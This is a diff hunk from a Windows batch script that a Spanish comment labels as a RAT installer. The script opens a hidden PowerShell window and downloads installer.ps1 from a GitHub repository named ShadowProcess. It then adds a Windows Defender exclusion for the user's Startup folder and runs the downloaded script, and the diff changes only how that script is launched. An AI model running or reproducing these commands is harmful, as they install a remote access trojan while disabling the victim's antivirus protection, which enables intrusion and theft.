@@ -32,4 +32,4 @@ if '%errorlevel%' NEQ '0' (
 @REM Rat obteniendo installer 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1"
 powershell Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
-powershell  ./installer.ps1
+powershell powershell.exe ./installer.ps1
